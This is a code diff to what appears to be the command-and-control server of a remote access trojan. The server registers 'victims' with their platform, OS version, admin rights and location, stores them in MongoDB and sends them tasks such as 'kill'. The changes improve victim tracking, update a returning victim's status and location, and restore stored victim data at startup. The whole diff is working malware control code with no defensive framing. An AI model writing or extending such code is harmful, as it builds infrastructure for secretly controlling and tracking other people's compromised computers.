@@ -63,7 +63,8 @@ def main(mongoclient,server_logger,port):
 			## If there is any task
 			if task:
 				if task['command'] == 'kill':
-
+					task_obj = Task.load_task(task)
+					task_dict = task_obj.issue_dict()
 					## Kill the victim by sending 'Die' and also update db
 					Victim.victims[victim_id].status = 'Dead'
 					Victim.victims[victim_id].update_last_seen_status_to_db()
@@ -132,7 +133,7 @@ def main(mongoclient,server_logger,port):
 			info = get_victim_info(request)
 			
 
-			if victim_id:
+			if victim_id not in Victim.victims:
 				## instantiate a new victim object
 				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'],location= info['location'])
 
@@ -140,8 +141,11 @@ def main(mongoclient,server_logger,port):
 				if victim_obj:
 					server_logger.info_log(f"New victim checked in - {victim_id} , {info['platform']}",'green')
 					return ('Victim registered', 200)
-				else:
-					return ('Victim already registered', 302)
+			else:
+				Victim.victims[victim_id].status = 'Alive'
+				Victim.victims[victim_id].location = info['location'] ## Incase changed
+				Victim.victims[victim_id].update_location_to_db()
+				return ('Victim already registered', 302)
 
 			return ('Bad request', 400)
 
@@ -204,4 +208,7 @@ if __name__=="__main__":
 	
 	Victim.mongoclient = db_object.mongoclient
 	Task.mongoclient = db_object.mongoclient
+
+	if db_object.db_data_exists():
+		db_object.load_db_data()
 	main(db_object.mongoclient,server_logger,port)
